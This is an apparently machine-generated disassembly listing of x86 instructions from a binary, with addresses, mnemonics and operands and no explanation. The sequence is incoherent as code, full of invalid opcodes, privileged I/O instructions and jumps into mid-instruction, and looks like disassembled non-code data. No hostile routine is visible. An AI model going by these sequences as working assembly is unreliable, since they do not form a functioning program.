  407441:	test   al,0x86
  407443:	leave  
  407444:	bswap  esi
  407446:	xor    al,0xc2
  407448:	inc    edi
  407449:	loop   0x4073f3
  40744b:	lahf   
  40744c:	xor    DWORD PTR [edi],ecx
  40744e:	lods   eax,DWORD PTR ds:[esi]
  40744f:	(bad)  
  407450:	cmp    ebx,edx
  407452:	mov    esp,ebx
  407454:	js     0x407446
  407456:	arpl   WORD PTR [edi-0x23],bp
  407459:	(bad)  
  40745a:	in     al,0x1a
  40745c:	jmp    0x4074ae
  40745e:	pop    edx
  40745f:	mov    al,ds:0x646228fd
  407464:	sbb    ebp,eax
  407466:	cmc    
  407467:	push   0xf200ab52
  40746c:	mov    ch,0x3e
  40746e:	and    DWORD PTR [edx+0x65],ecx
  407471:	test   al,0x2e
  407473:	test   DWORD PTR [ebx-0x2d932568],ebx
  407479:	jo     0x4074a9
  40747b:	ja     0x40740d
  40747d:	cmp    DWORD PTR [eax],edx
  40747f:	shr    BYTE PTR [ebx],1
  407481:	jmp    0x407489
  407483:	or     ah,BYTE PTR [ebp+0x671762e8]
  407489:	ret    
  40748a:	mov    ebx,db1
  40748d:	aaa    
  40748e:	bnd jl 0x40741a
  407491:	xchg   ebx,eax
  407492:	push   ss
  407493:	adc    ebp,DWORD PTR [ebx]
  407495:	int3   
  407496:	iret   
  407497:	test   eax,0x735d4b65
  40749c:	dec    eax
  40749d:	dec    ecx
  40749e:	and    eax,0xc2be19d1
  4074a3:	inc    edi
  4074a4:	jb     0x40743e
  4074a6:	jae    0x4074e0
  4074a8:	dec    esi
  4074a9:	jo     0x407445
  4074ab:	inc    ebx
  4074ac:	int    0x66
  4074ae:	xchg   BYTE PTR [esi-0x16],bl
  4074b1:	(bad)  
  4074b2:	adc    eax,edi
  4074b4:	fistp  DWORD PTR [ecx-0x1d329a91]
  4074ba:	pop    ds
  4074bb:	out    0x40,al
  4074bd:	or     ebx,ebx
  4074bf:	lds    ebx,FWORD PTR [edx+0x7d]
  4074c2:	mov    BYTE PTR [ebx+0x54d9fd24],bh
  4074c8:	call   0xafee:0x1b2636c6
  4074cf:	push   ds
  4074d0:	in     eax,0xdc
  4074d2:	fld1   
  4074d4:	xor    esp,0x76
  4074d7:	shl    DWORD PTR [esp+ecx*2-0x70321847],cl
  4074de:	inc    edx
  4074df:	sbb    cl,BYTE PTR [edx]
  4074e1:	mov    dh,0x83
  4074e3:	adc    DWORD PTR [edi-0x2004b13c],ebx
  4074e9:	dec    esi
  4074ea:	test   ebx,0x938de48e
  4074f0:	pop    esp
  4074f1:	in     al,dx
  4074f2:	push   esp
  4074f3:	cld    
  4074f4:	or     eax,0x74dbb7f8
  4074f9:	or     dl,BYTE PTR [edx]
  4074fb:	popf   
  4074fc:	cli    
  4074fd:	es inc esp
  4074ff:	mov    ds:0x10108ec2,eax
  407504:	cmc    
  407505:	iret   
  407506:	push   ecx
  407507:	xor    BYTE PTR [edi+0x4e3db3f5],bh
  40750d:	fdivr  QWORD PTR [ebx]
  40750f:	sub    eax,0xfa3a68dc
  407514:	in     al,0xce
  407516:	test   DWORD PTR [ebp-0x46361110],ecx
  40751c:	mov    ds:0x8a4d4fc8,al
  407521:	dec    esi
  407522:	sub    DWORD PTR [eax],0xffffffc7
  407525:	fucomi st,st(4)
  407527:	lods   al,BYTE PTR ds:[esi]
  407528:	inc    ebx
  407529:	mov    ds,WORD PTR [ebx+0x15]
  40752c:	mov    eax,ds:0xae623402
  407531:	test   ch,ch
  407533:	fidiv  WORD PTR [ebx]
  407535:	bound  esp,QWORD PTR [eax]
  407537:	xor    ebx,DWORD PTR [esi-0x75]
  40753a:	sysexit 
  40753c:	push   edx
  40753d:	ror    BYTE PTR [ebx+0x49],1
  407540:	jle    0x40759e
  407542:	hlt    
  407543:	sar    BYTE PTR [edx-0x44a0385],cl
  407549:	push   ds
  40754a:	jb     0x4074f3
  40754c:	push   es
  40754d:	test   eax,0xdf33694
  407552:	jne    0x40755b
  407554:	ins    DWORD PTR es:[edi],dx
  407555:	je     0x407554
  407557:	add    al,0x52
  407559:	test   al,0xb0
  40755b:	call   0xd481:0xdb17bbba
  407562:	add    BYTE PTR gs:[ebp-0x6b9f7c07],bl
  407569:	hlt    
  40756a:	xchg   edi,eax
  40756b:	mov    ss,WORD PTR [ecx+0x5e973dc9]
  407571:	mov    ah,0xc9
  407573:	out    0x4c,eax
  407575:	pop    esp
  407576:	xchg   BYTE PTR [edx-0x2a586b1b],ch
  40757c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757d:	push   0x4d440042
  407582:	popf   
  407583:	xchg   ebp,eax
  407584:	jns    0x40756b
  407586:	cmc    
  407587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407588:	add    DWORD PTR [ebp-0x5db1d018],edx
  40758e:	sub    dh,BYTE PTR [esi+0x59b7de09]
  407594:	pop    esi
  407595:	xor    BYTE PTR [esi+edx*2-0x344fc333],cl
  40759c:	pop    ds
  40759d:	push   eax
  40759e:	int3   
  40759f:	int3   
  4075a0:	js     0x4075f7
  4075a2:	xlat   BYTE PTR ds:[ebx]
  4075a3:	push   edi
  4075a4:	push   0x5847a20a
  4075a9:	add    edx,DWORD PTR ds:0xef60433d
  4075af:	adc    cl,bl
  4075b1:	cmc    
  4075b2:	jp     0x407542
  4075b4:	dec    esi
  4075b5:	repnz adc al,BYTE PTR [ebp+0x73]
  4075b9:	in     al,0x5
  4075bb:	cmp    esi,DWORD PTR [edi-0x2a]
  4075be:	imul   eax,esi,0xa2449e78
  4075c4:	add    ch,BYTE PTR [edi]
  4075c6:	add    DWORD PTR [esi+ebx*2-0x694f1145],ebp
  4075cd:	repz arpl WORD PTR [edx-0x53],ax
  4075d1:	dec    eax
  4075d2:	in     al,dx
  4075d3:	xor    ecx,DWORD PTR [eax-0x3d]
  4075d6:	jns    0x4075a2
  4075d8:	mov    al,ds:0x62aa08ff
  4075dd:	dec    ecx
  4075de:	ret    0x6e0d
  4075e1:	out    dx,al
  4075e2:	inc    eax
  4075e3:	cmp    eax,0x1c99c712
  4075e8:	pop    ebp
  4075e9:	adc    cl,BYTE PTR [ecx+0x382bfe61]
  4075ef:	call   0x8ccf:0xb70cab3f
  4075f6:	ins    DWORD PTR es:[edi],dx
  4075f7:	in     al,0x4c
  4075f9:	mov    dh,0xba
  4075fb:	pop    ebx
  4075fc:	not    BYTE PTR [esi+0x19]
  4075ff:	dec    ecx
  407600:	or     DWORD PTR [edx-0x76],edi
  407603:	in     al,0xf8
  407605:	jb     0x407661
  407607:	ins    BYTE PTR es:[edi],dx
  407608:	add    cl,BYTE PTR [edx]
  40760a:	inc    ebx
  40760b:	popf   
  40760c:	ficom  DWORD PTR [ebx-0x6fd5f1f2]
  407612:	es stos DWORD PTR es:[edi],eax
  407614:	lods   eax,DWORD PTR ds:[esi]
  407615:	loope  0x4075b1
  407617:	xor    DWORD PTR [esi],0x3a
  40761a:	ja     0x407625
  40761c:	jg     0x4075fa
  40761e:	jo     0x4075c8
  407620:	xchg   edi,eax
  407621:	nop    DWORD PTR ds:0xff3fe8a7
  407628:	in     al,0xb4
  40762a:	jbe    0x40764d
  40762c:	dec    ebp
  40762d:	lds    ebx,FWORD PTR [eax+eiz*4-0x2fb4bbd]
  407634:	(bad)  
  407635:	mov    dh,0x28
  407637:	aas    
  407638:	add    BYTE PTR [edx],cl
  40763a:	jmp    0x40763d
  40763c:	inc    edx
  40763d:	mov    edx,0xe88a581d
  407642:	into   
  407643:	mov    WORD PTR [edx-0x355ae01a],?
  407649:	fild   WORD PTR [ecx+0xc]
  40764c:	nop
  40764d:	(bad)
  407651:	gs popa 
  407653:	sub    eax,DWORD PTR [eax+eax*8]
  407656:	xchg   bx,ax
  407658:	das    
  407659:	ret    
  40765a:	test   BYTE PTR [esp+ecx*8-0x698228a3],bl
  407661:	lahf   
  407662:	call   0x6aa4:0xca0a80f8
  407669:	or     al,0x7
  40766b:	cmp    eax,0xf5c61c55
  407670:	call   0xc96e:0x508fe245
  407677:	or     eax,0xe5fded62
  40767c:	push   eax
  40767d:	jo     0x4076a2
  40767f:	cmp    bh,BYTE PTR [esi-0x2f4fa7d6]
  407685:	dec    ebx
  407686:	add    ah,ah
  407688:	jno    0x407709
  40768a:	inc    ebp
  40768b:	and    esi,DWORD PTR [edx]
  40768d:	scas   al,BYTE PTR es:[edi]
  40768e:	(bad)  
  40768f:	jnp    0x407635
  407691:	jl     0x4076a5
  407693:	fcomi  st,st(5)
  407695:	jb     0x40767d
  407697:	mov    dh,0x6d
  407699:	adc    al,0xea
  40769b:	ss (bad) 
  40769e:	xchg   ebp,eax
  40769f:	mov    ds:0xe7e79ecb,eax
  4076a4:	imul   eax,DWORD PTR [ebx],0xffffffa2
  4076a7:	push   edx
  4076a8:	aad    0x9c
  4076aa:	in     al,dx
  4076ab:	(bad)  
  4076ac:	loope  0x407711
  4076ae:	aad    0xb2
  4076b0:	fnsave [edi]
  4076b2:	les    edi,FWORD PTR [ebp-0x2f]
  4076b5:	jnp    0x407727
  4076b7:	loop   0x4076ad
  4076b9:	jp     0x4076b9
  4076bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076bc:	jbe    0x407688
  4076be:	sbb    ebx,DWORD PTR [ebp-0x340dd78a]
  4076c4:	mov    ds:0x4f61c928,eax
  4076c9:	stos   DWORD PTR es:[edi],eax
  4076ca:	int3   
  4076cb:	dec    eax
  4076cc:	xchg   BYTE PTR [eax],dh
  4076ce:	in     al,dx
  4076cf:	es stos BYTE PTR es:[edi],al
  4076d1:	pop    esp
  4076d2:	jg     0x407729
  4076d4:	push   ebp
  4076d5:	inc    ecx
  4076d6:	mov    eax,0x4d7bdd79
  4076db:	pop    ss
  4076dc:	in     al,dx
  4076dd:	dec    DWORD PTR [esi]
  4076df:	push   eax
  4076e0:	sbb    ebx,0x730e9b89
  4076e6:	xchg   BYTE PTR [edi+0x1b],cl
  4076e9:	ja     0x407730
  4076eb:	or     al,0x44
  4076ed:	adc    eax,0x547b0df3
  4076f2:	add    BYTE PTR [edi],dh
  4076f4:	scas   al,BYTE PTR es:[edi]
  4076f5:	or     eax,0xf6b6194e
  4076fa:	mov    ds:0x5bd43aab,eax
  4076ff:	popf   
  407700:	cld    
  407701:	push   edx
  407702:	loopne 0x4076f5
  407704:	dec    edi
  407705:	(bad)  
  407706:	xchg   esp,eax
  407707:	hlt    
  407708:	pop    eax
  407709:	jo     0x4076d7
  40770b:	sar    edx,cl
  40770d:	mov    dh,0x29
  40770f:	cld    
  407710:	and    DWORD PTR [esi-0x64],0x97dc6141
  407717:	ret    0xa1db
  40771a:	addr16 js 0x40775c
  40771d:	loopne 0x407755
  40771f:	call   0xc80b:0x422fa492
  407726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407727:	mov    eax,0x1a0fe6b1
  40772c:	fisubr WORD PTR [edx-0x3eb17c97]
  407732:	icebp  
  407733:	push   ecx
  407734:	data16 fild DWORD PTR [edx-0x4]
  407738:	sbb    BYTE PTR [ebx-0xf],dl
  40773b:	mov    cl,0xc1
  40773d:	fsubr  QWORD PTR [ebx+0x32f2b0a6]
  407743:	test   eax,0x5f2c83ef
  407748:	cmp    BYTE PTR [ecx+edx*8+0x21],ah
  40774c:	push   eax
  40774d:	jmp    0x452bfdf9
  407752:	dec    eax
  407753:	and    ecx,DWORD PTR ds:0x7d20a1be
  407759:	out    dx,al
  40775a:	adc    dl,dh
  40775c:	stos   DWORD PTR es:[edi],eax
  40775d:	inc    ecx
  40775e:	repz push ebx
  407760:	sub    eax,0xac05890f
  407765:	dec    esp
  407766:	xlat   BYTE PTR ds:[ebx]
  407767:	dec    esi
  407768:	test   BYTE PTR [ecx-0x15be9a77],al
  40776e:	sahf   
  40776f:	jbe    0x407778
  407771:	ss nop
  407773:	adc    BYTE PTR [ecx-0x490f89e9],0x74
  40777a:	mov    ah,0xf0
  40777c:	sub    al,0x95
  40777e:	scas   eax,DWORD PTR es:[edi]
  40777f:	daa    
  407780:	rcr    ebx,cl
  407782:	cs jp  0x407783
  407785:	in     eax,dx
  407786:	in     eax,dx
  407787:	div    BYTE PTR [esp+ecx*8-0x34]
  40778b:	mov    esp,DWORD PTR [esi]
  40778d:	in     eax,0x47
  40778f:	push   edi
  407790:	cmc    
  407791:	cmp    dh,dl
  407793:	xchg   esp,eax
  407794:	xor    ah,BYTE PTR [edi]
  407796:	aaa    
  407797:	mov    edx,0xc141056e
  40779c:	pop    ebx
  40779d:	inc    edx
  40779e:	inc    ebp
  40779f:	mov    al,0x16
  4077a1:	cdq    
  4077a2:	ret    0x2bd
  4077a5:	js     0x4077b8
  4077a7:	cmp    edi,DWORD PTR [ebx]
  4077a9:	out    dx,eax
  4077aa:	xchg   ecx,eax
  4077ab:	ja     0x4077bd
  4077ad:	jbe    0x407797
  4077af:	cmc    
  4077b0:	pop    ebx
  4077b1:	push   esi
  4077b2:	je     0x4077ec
  4077b4:	icebp  
  4077b5:	xchg   esp,eax
  4077b6:	xlat   BYTE PTR ds:[ebx]
  4077b7:	ins    DWORD PTR es:[edi],dx
  4077b8:	out    dx,eax
  4077b9:	sub    dl,BYTE PTR [esi]
  4077bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077bc:	xchg   edi,eax
  4077bd:	xchg   ebx,eax
  4077be:	xor    al,0xc3
  4077c0:	aas    
  4077c1:	mov    dl,0xc
  4077c3:	jbe    0x4077fc
  4077c5:	pop    esp
  4077c6:	hlt    
  4077c7:	leave  
  4077c8:	dec    ecx
  4077c9:	push   ds
  4077ca:	lea    ecx,[esi+0x20]
  4077cd:	cdq    
  4077ce:	bound  ebx,QWORD PTR [ebx+0x27c18da2]
  4077d4:	pop    ebx
  4077d5:	add    dl,BYTE PTR [edx]
  4077d7:	ins    BYTE PTR es:[edi],dx
  4077d8:	imul   esp,DWORD PTR [eax+0x58],0xffffffeb
  4077dc:	cwde   
  4077dd:	mov    al,0x36
  4077df:	add    DWORD PTR [edi+0x3f],esp
  4077e2:	push   edx
  4077e3:	xor    BYTE PTR [ebp-0x2bcf8658],bl
  4077e9:	xlat   BYTE PTR ds:[ebx]
  4077ea:	adc    al,0xbc
  4077ec:	mov    eax,ds:0x5b6d76ba
  4077f1:	mov    dh,0x4b
  4077f3:	mov    dl,0x7c
  4077f5:	push   ss
  4077f6:	and    al,0x33
  4077f8:	(bad)  
  4077f9:	div    BYTE PTR [ecx-0x43]
  4077fc:	aaa    
  4077fd:	cmp    eax,0x69548068
  407802:	daa    
  407803:	mov    esi,DWORD PTR [esp+ebp*4]
  407806:	add    eax,DWORD PTR [edi+0x1365979b]
  40780c:	es jnp 0x407822
  40780f:	(bad)  
  407810:	sub    ecx,DWORD PTR [edx+0x79cad2a9]
  407816:	dec    eax
  407817:	sbb    al,0xa7
  407819:	and    DWORD PTR [edi+0x268b3da8],0xea2ea315
  407823:	inc    esi
  407824:	shr    ebx,1
  407826:	and    al,0xfb
  407828:	dec    edx
  407829:	push   bx
  40782b:	mov    dl,0x1a
  40782d:	add    eax,0x4b03b1dc
  407832:	imul   ebp,DWORD PTR [ebx+0x32da1150],0xf990253c
  40783c:	cs ss jo 0x407890
  407840:	mov    WORD PTR [ecx-0x3dabf707],cs
  407846:	mov    WORD PTR [edi+0x22d3d59],?
  40784c:	sub    BYTE PTR [edx],bh
  40784e:	push   es
  40784f:	outs   dx,DWORD PTR ds:[esi]
  407850:	fst    QWORD PTR ds:0x30dc48a0
  407856:	jg     0x4077ee
  407858:	mov    ebx,ebp
  40785a:	xor    BYTE PTR [edi+0x2547fb00],al
  407860:	sbb    edi,esp
  407862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407863:	jl     0x40781f
  407865:	add    BYTE PTR [esi],ah
  407867:	adc    al,0x81
  407869:	not    DWORD PTR [edi-0x46]
  40786c:	push   ebx
  40786d:	xchg   ecx,eax
  40786e:	mov    edi,edx
  407870:	or     ch,BYTE PTR [edx-0x73]
  407873:	out    0x51,eax
  407875:	mov    ds:0x7c1b1a99,al
  40787a:	outs   dx,DWORD PTR ds:[esi]
  40787b:	dec    esp
  40787c:	jnp    0x4078ca
  40787e:	mov    BYTE PTR [eax],bh
  407880:	push   bp
  407882:	(bad)  
  407883:	out    0x6f,al
  407885:	clc    
  407886:	mov    eax,0xa83742ba
  40788b:	jns    0x4078af
  40788d:	mov    ds:0xd955d3c,eax
  407892:	inc    edi
  407893:	into   
  407894:	ja     0x407915
  407896:	pop    eax
  407897:	into   
  407898:	das    
  407899:	(bad)  
  40789a:	popf   
  40789b:	std    
  40789c:	inc    esp
  40789d:	jecxz  0x4078a6
  40789f:	sbb    esi,DWORD PTR [eax]
  4078a1:	sub    eax,0xf8bd1cef
  4078a6:	pop    ss
  4078a7:	outs   dx,BYTE PTR ds:[esi]
  4078a8:	push   es
  4078a9:	data16 cli 
  4078ab:	std    
  4078ac:	pop    esp
  4078ad:	or     bl,BYTE PTR [ecx]
  4078af:	adc    BYTE PTR [eax-0x15],bh
  4078b2:	rep ins WORD PTR es:[edi],dx
  4078b5:	ins    BYTE PTR es:[edi],dx
  4078b6:	das    
  4078b7:	cli    
  4078b8:	jmp    edi
  4078ba:	pop    ecx
  4078bb:	mov    dl,0x68
  4078bd:	outs   dx,BYTE PTR ds:[esi]
  4078be:	cmp    DWORD PTR [esi+0x65],edi
  4078c1:	push   edx
  4078c2:	scas   al,BYTE PTR es:[edi]
  4078c3:	push   ds
  4078c4:	arpl   bx,cx
  4078c6:	mov    ds:0x2b90e74b,eax
  4078cb:	out    0x2b,eax
  4078cd:	sub    al,0xc6
  4078cf:	xchg   edx,eax
  4078d0:	push   0xfb40fd39
  4078d5:	and    ebp,edi
  4078d7:	lods   al,BYTE PTR ds:[esi]
  4078d8:	int3   
  4078d9:	jl     0x40791b
  4078db:	xor    eax,0xa26927e
  4078e0:	jo     0x4078ea
  4078e2:	in     eax,dx
  4078e3:	jecxz  0x407917
  4078e5:	scas   al,BYTE PTR es:[edi]
  4078e6:	jns    0x40788c
  4078e8:	sub    eax,0x7882b493
  4078ed:	mov    esi,0x17e004bf
  4078f2:	add    BYTE PTR [ebp-0x42f7ce9a],dh
  4078f8:	sbb    BYTE PTR [esi+0x16],ah
  4078fb:	emms   
  4078fd:	les    ebp,FWORD PTR [esi-0x5c621878]
  407903:	neg    esi
  407905:	imul   eax,DWORD PTR [esi+0x23],0x6ab9b8d6
  40790c:	push   ss
  40790d:	nop
  40790e:	je     0x407894
  407910:	sub    BYTE PTR [ebp+eax*8+0x51c7bb12],bl
  407917:	xchg   esp,eax
  407918:	rcr    BYTE PTR [edi+0x135283c5],0xb1
  40791f:	or     BYTE PTR [ecx+edi*2],ch
  407922:	test   DWORD PTR [eax+0x57],edx
  407925:	aaa    
  407926:	std    
  407927:	jl     0x4078e5
  407929:	add    edi,DWORD PTR [edi-0x4d]
  40792c:	pop    ds
  40792d:	(bad)  [esp+ebx*8]
  407930:	test   cl,al
  407932:	mov    esi,0x186f24e9
  407937:	mov    dh,0x37
  407939:	loopne 0x4078db
  40793b:	mov    al,bh
  40793d:	mov    cl,0xae
  40793f:	test   eax,0xba10062b
  407944:	and    DWORD PTR [esi-0x6],edx
  407947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407948:	aad    0x6e
  40794a:	das    
  40794b:	pop    ecx
  40794c:	aaa    
  40794d:	dec    esp
  40794e:	test   eax,0x3612e1c1
  407953:	jo     0x40798b
  407955:	in     eax,0x93
  407957:	psrad  mm5,QWORD PTR [eax-0x26]
  40795b:	mov    ah,0x2a
  40795d:	(bad)  
  40795e:	cmc    
  40795f:	mov    ebp,0xb03e92f5
  407964:	jnp    0x4078ec
  407966:	xor    al,0x20
  407968:	jnp    0x407981
  40796a:	xlat   BYTE PTR ds:[ebx]
  40796b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40796c:	pop    edi
  40796d:	outs   dx,BYTE PTR ds:[esi]
  40796e:	xchg   edi,eax
  40796f:	ficom  DWORD PTR [edi]
  407971:	leave  
  407972:	push   ebp
  407973:	aad    0xb9
  407975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407976:	xchg   edx,eax
  407977:	sub    eax,ecx
  407979:	dec    edi
  40797a:	pop    ebx
  40797b:	in     al,dx
  40797c:	imul   esi,DWORD PTR [ebp+0x77],0xffffffb0
  407980:	xchg   DWORD PTR [ecx+0x2a],ecx
  407983:	dec    eax
  407984:	xor    al,0x1c
  407986:	popf   
  407987:	outs   dx,BYTE PTR ds:[esi]
  407988:	inc    ebp
  407989:	adc    al,0x48
  40798b:	add    eax,0x38774abe
  407990:	loope  0x4079e4
  407992:	fs jo  0x407930
  407995:	scas   al,BYTE PTR es:[edi]
  407996:	pop    ebx
  407997:	sbb    DWORD PTR [ebx],eax
  407999:	lods   al,BYTE PTR ds:[esi]
  40799a:	pusha  
  40799b:	pop    ebp
  40799c:	add    BYTE PTR [eax-0x14],dh
  40799f:	scas   eax,DWORD PTR es:[edi]
  4079a0:	inc    esi
  4079a1:	ins    DWORD PTR es:[edi],dx
  4079a2:	push   esi
  4079a3:	adc    eax,DWORD PTR [ebx-0x4d]
  4079a6:	pop    ds
  4079a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a8:	push   ecx
  4079a9:	(bad)  
  4079aa:	aaa    
  4079ab:	or     al,0x57
  4079ad:	lea    ebp,[ebx-0x63eb6061]
  4079b3:	cmp    esi,edx
  4079b5:	dec    edx
  4079b6:	inc    ecx
  4079b7:	into   
  4079b8:	inc    eax
  4079b9:	out    dx,eax
  4079ba:	xchg   esp,eax
  4079bb:	fcomp  QWORD PTR [esi-0x24ba6c12]
  4079c1:	cmp    eax,0x4b07239b
  4079c6:	jle    0x40794f
  4079c8:	xchg   BYTE PTR [esi],bh
  4079ca:	outs   dx,DWORD PTR ds:[esi]
  4079cb:	test   DWORD PTR ds:0x2c1cc8a2,edi
  4079d1:	aam    0x9c
  4079d3:	or     eax,0x7c4c5d37
  4079d8:	je     0x4079c0
  4079da:	sbb    BYTE PTR [ebx+0x61ad4cc0],bh
  4079e0:	rcl    DWORD PTR [ebx+0x2797919a],cl
  4079e6:	ret    
  4079e7:	mov    edi,0xf7e1c6fc
  4079ec:	loope  0x407972
  4079ee:	cmp    al,0xcb
  4079f0:	mov    BYTE PTR [eax+esi*1-0x78],bh
  4079f4:	cwde   
  4079f5:	iret   
  4079f6:	out    dx,eax
  4079f7:	push   esp
  4079f8:	test   eax,0x56c0f814
  4079fd:	gs mov ebp,0xf9d96cc7
  407a03:	cmp    bh,BYTE PTR [edi+0x52]
  407a06:	push   es
  407a07:	sar    ebx,0x15
  407a0a:	test   eax,0x50624f1d
  407a0f:	sub    DWORD PTR [edx+0x12],0xffffffba
  407a13:	nop
  407a14:	popa   
  407a15:	outs   dx,BYTE PTR ds:[esi]
  407a16:	enterw 0xa71f,0x4
  407a1b:	mov    dh,0xc2
  407a1d:	add    BYTE PTR [ebx-0x358e0cfe],0x49
  407a24:	cmp    eax,0x332902ea
  407a29:	dec    ecx
  407a2a:	repnz sub eax,0x1e10f1e9
  407a30:	mov    ds:0x46ed28c8,al
  407a35:	jmp    0xc58c0f37
  407a3a:	push   es
  407a3b:	jmp    0xfea7:0xa0e86516
  407a42:	mov    ds:0x9ff8bd94,al
  407a47:	xor    cl,BYTE PTR [ebx-0x4f]
  407a4a:	or     al,0xd9
  407a4c:	mov    eax,0x18adeb53
  407a51:	add    BYTE PTR [ecx+0x6d],ch
  407a54:	sar    BYTE PTR [ebx+0x12],1
  407a57:	test   DWORD PTR [edi-0x51],0x4f20f39c
  407a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a5f:	call   0x91cb:0x38247315
  407a66:	test   al,0x6d
  407a68:	adc    ecx,DWORD PTR ds:0xa72609f5
  407a6e:	and    eax,0xb1397dd1
  407a73:	lods   al,BYTE PTR ds:[esi]
  407a74:	mov    ah,0xb3
  407a76:	neg    BYTE PTR [ebx-0x60]
  407a79:	ins    WORD PTR es:[edi],dx
  407a7b:	clc    
  407a7c:	popa   
  407a7d:	arpl   dx,si
  407a7f:	jle    0x407a34
  407a81:	in     al,0x1e
  407a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a84:	rcr    DWORD PTR [edx+0x38],cl
  407a87:	inc    esp
  407a88:	gs mov dh,0x27
  407a8b:	inc    edx
  407a8c:	test   BYTE PTR [edx+0x58be78d4],bh
  407a92:	push   ebx
  407a93:	das    
  407a94:	rcl    DWORD PTR [ebx],0x7d
  407a97:	and    al,0x46
  407a99:	popf   
  407a9a:	xchg   DWORD PTR [eax],edx
  407a9c:	dec    edx
  407a9d:	icebp  
  407a9e:	js     0x407a61
  407aa0:	sbb    edi,DWORD PTR [ebp+ebp*2+0x61]
  407aa4:	mov    edi,0x32efc36a
  407aa9:	sub    al,0xa0
  407aab:	mov    eax,DWORD PTR [ebx-0x7c]
  407aae:	xchg   edi,eax
  407aaf:	sar    BYTE PTR [edx+0x3ca18c23],0x92
  407ab6:	push   edx
  407ab7:	xchg   ebx,eax
  407ab8:	sub    al,0x79
  407aba:	mov    ecx,0x190c979a
  407abf:	inc    esp
  407ac0:	pop    ds
  407ac1:	jo     0x407a47
  407ac3:	sub    DWORD PTR [ecx-0x29],ebx
  407ac6:	ds ins DWORD PTR es:[edi],dx
  407ac8:	or     ah,BYTE PTR [eax-0x46431e3d]
  407ace:	sbb    BYTE PTR [ecx+0x720f48b8],dl
  407ad4:	cmp    al,0xa3
  407ad6:	push   ecx
  407ad7:	cmc    
  407ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad9:	add    DWORD PTR [ebx+0x15],ebp
  407adc:	in     al,0xa6
  407ade:	pop    es
  407adf:	pop    eax
  407ae0:	and    ah,BYTE PTR [edx]
  407ae2:	mov    ah,0x97
  407ae4:	lock (bad) 
  407ae6:	xlat   BYTE PTR ds:[ebx]
  407ae7:	push   esi
  407ae8:	pushf  
  407ae9:	mov    ds:0x549e41e5,al
  407aee:	mov    ebx,0x5765d5e
  407af3:	or     al,0x22
  407af5:	pop    edx
  407af6:	outs   dx,BYTE PTR ds:[esi]
  407af7:	mov    edi,0x3b5d42d9
  407afc:	ror    dh,1
  407afe:	xor    eax,0x89fa693
  407b03:	lods   al,BYTE PTR ds:[esi]
  407b04:	outs   dx,DWORD PTR ds:[esi]
  407b05:	pop    ss
  407b06:	jnp    0x407aad
  407b08:	fld    DWORD PTR [eax-0x61]
  407b0b:	sub    ecx,ebx
  407b0d:	test   BYTE PTR [ebx],dh
  407b0f:	es aad 0x52
  407b12:	popa   
  407b13:	sub    eax,0xd2876291
  407b18:	test   BYTE PTR [ebx+0x771416d3],bl
  407b1e:	or     al,0x68
  407b20:	add    DWORD PTR [ecx+ebx*8+0x2c],ebp
  407b24:	mov    al,ds:0x21e8ca2c
  407b29:	stc    
  407b2a:	aas    
  407b2b:	jle    0x407b0b
  407b2d:	(bad)  
  407b2e:	stos   BYTE PTR es:[edi],al
  407b2f:	lods   eax,DWORD PTR ds:[esi]
  407b30:	mov    ds:0xe1bc2109,eax
  407b35:	icebp  
  407b36:	jbe    0x407b43
  407b38:	or     eax,0xf627aacd
  407b3d:	bound  edi,QWORD PTR [ebx-0x47013ca]
  407b43:	jp     0x407ac5
  407b45:	jnp    0x407b39
  407b47:	rol    BYTE PTR [ecx+0x2d],0x6e
  407b4b:	inc    edx
  407b4c:	jmp    0xedc048c3
  407b51:	sub    ch,BYTE PTR [edi]
  407b53:	(bad)  
  407b54:	jp     0x407afd
  407b56:	xchg   esp,eax
  407b57:	out    dx,al
  407b58:	and    BYTE PTR [edi],bh
  407b5a:	fwait
  407b5b:	ins    BYTE PTR es:[edi],dx
  407b5c:	sbb    DWORD PTR [esi],ebx
  407b5e:	imul   ebp,edi,0x39
  407b61:	mov    ch,0x24
  407b63:	dec    edi
  407b64:	push   ds
  407b65:	jecxz  0x407b1e
  407b67:	les    edx,FWORD PTR gs:[esi]
  407b6a:	pop    ss
  407b6b:	mov    DWORD PTR [edx+0x50],edx
  407b6e:	sub    BYTE PTR [esi+0x48101e82],al
  407b74:	mov    esp,0xbff15854
  407b79:	push   edx
  407b7a:	jecxz  0x407b6d
  407b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b7d:	(bad)  
  407b7e:	rol    DWORD PTR [ebp-0x3d],cl
  407b81:	sub    al,0x2e
  407b83:	shl    BYTE PTR [ebp+0x47],0xf7
  407b87:	and    al,0x98
  407b89:	cwde   
  407b8a:	xchg   ebx,eax
  407b8b:	cmp    eax,0xb5b2f198
  407b90:	pusha  
  407b91:	xor    eax,0x5a1d3b00
  407b96:	mov    edi,0x37ca5f13
  407b9b:	or     eax,0x35ec32a1
  407ba0:	add    ch,BYTE PTR [edi]
  407ba2:	fwait
  407ba3:	lods   al,BYTE PTR ds:[esi]
  407ba4:	shr    BYTE PTR [esi-0x17833317],0xdf
  407bab:	jecxz  0x407b74
  407bad:	xchg   edx,eax
  407bae:	mov    ebp,0xe1941bb9
  407bb3:	sub    eax,DWORD PTR ds:[ecx-0x4f283c4b]
  407bba:	lock mov ?,WORD PTR [ecx]
  407bbd:	retf   
  407bbe:	or     ah,BYTE PTR [esp+esi*1]
  407bc1:	in     al,dx
  407bc2:	pop    esi
  407bc3:	rol    DWORD PTR ds:0xc6e86492,0xe7
  407bca:	mov    ch,0x4c
  407bcc:	inc    edx
  407bcd:	dec    eax
  407bce:	sub    BYTE PTR [ebp+0x378a3dce],bh
  407bd4:	jo     0x407bd2
  407bd6:	xlat   BYTE PTR ds:[ebx]
